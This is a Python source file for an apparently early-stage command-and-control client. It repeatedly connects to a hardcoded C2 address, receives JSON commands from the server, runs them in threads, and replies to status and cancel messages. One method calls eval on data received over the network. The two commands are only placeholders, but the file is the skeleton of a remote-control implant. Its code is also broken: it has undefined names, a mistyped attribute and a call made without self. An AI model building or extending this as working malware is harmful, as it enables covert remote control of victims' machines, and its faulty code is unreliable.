import socket
import time
import threading
import json


class Client():
    def __init__(self):
        self.c2server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.c2server_address = ('192.168.175.129', 4591)
        self.commands = {1: self.command1, 2: self.command2}
        self.event_controller = threading.Event()


    def connect_to_c2(self):
        while True:
            try:
                self.c2server_socket.connect(self.c2server_address)
            except:
                print("Failed to connect to C2 server.")
                print("Retrying C2 connection in 10 seconds...")
                time.sleep(10)
                continue

            listen_for_commands(c2server_socket)


    def listen_for_commands(self):
        while True:
            try:
                command_data = self.c2server_socket.recv(1024).decode()
                command_data = json.load(command)
                command_id = command_data['command_id']
                command_args = command_data['command_args']

                command_function = commands[command_id]
                self.event_controller.set()
                thread = threading.Thread(target=command_function, args=(command_args,))
                thread.start()

            except:
                self.c2server_socket.sendall(b"Error: invalid command!")
                break

            self.c2_server.settimeout(10.0)
            while self.event_controller.is_set():
                try:
                    message = self.c2server_socket.recv(1024)
                except:
                    continue

                if message == b"cancel":
                    self.event_controller.clear()
                elif message == b"status":
                    self.c2server_socket.sendall(b"Working")

    
    def command_wrapper(command):
        def command_controller(self, command_args):
            while self.event_controller.is_set():
                is_done = command(self, command_args)
                if is_done:
                    self.event_controller.clear()
        return command_controller


    @command_wrapper
    def command1(self, command_args):
        print("Command started")
        time.sleep(30)
        print("Command finished")
        return True

    def command2(self):
        pass

    def execute_command(self, command):
        self.c2server_socket.sendall(b'Started command')
        eval(commands[command[command_id]], {'__builtins__':None}, commands)


if __name__ == "__main__":
    client = Client()
    client.connect_to_c2()

